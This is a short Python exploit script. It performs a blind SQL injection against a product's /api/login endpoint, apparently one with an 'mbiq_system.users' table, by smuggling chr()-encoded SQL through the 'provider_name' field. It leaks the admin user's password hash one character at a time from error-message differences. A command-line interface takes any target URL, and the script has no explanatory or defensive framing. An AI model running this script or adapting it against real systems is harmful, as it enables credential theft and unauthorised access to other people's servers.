import string
 
import requests
import urllib3
import argparse
 
urllib3.disable_warnings()
 
def encode_string(s: str) -> str:
    return ",".join([f"chr({ord(c)})" for c in s])
 
def leak_hash(target: str, target_user: str = "admin"):
    charset = string.digits + string.ascii_letters + '/.$'
    encoded_user = encode_string(target_user)
 
    URL = f"{target}/api/login"
    current_guess = ''
    while True:
        guessed = False
        for guess in charset:
            full_guess = encode_string(current_guess + guess + '%')
            stuff = requests.post(URL, json={
                "username": "fake_user",
                "password": "password",
                "provider_type": "LDAP",
                "provider_name": f"LDAPP'or' name = (select case when (password like concat({full_guess})) then chr(76)||chr(111)||chr(99)||chr(97)||chr(108) else chr(76) end from mbiq_system.users where username like concat({encoded_user}) limit 1)"
            }, verify=False).json()
            if "root distinguished name is required" in stuff["message"]:
                guessed = True
                current_guess += guess
                print("[+]", current_guess)
                break
        if not guessed:
            break
 
if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='Leak the admin password hash')
    parser.add_argument('target', type=str, help='The target URL')
    parser.add_argument('target_user', type=str, help='The target user', default='admin', nargs='?')
    args = parser.parse_args()
    leak_hash(args.target, args.target_user)
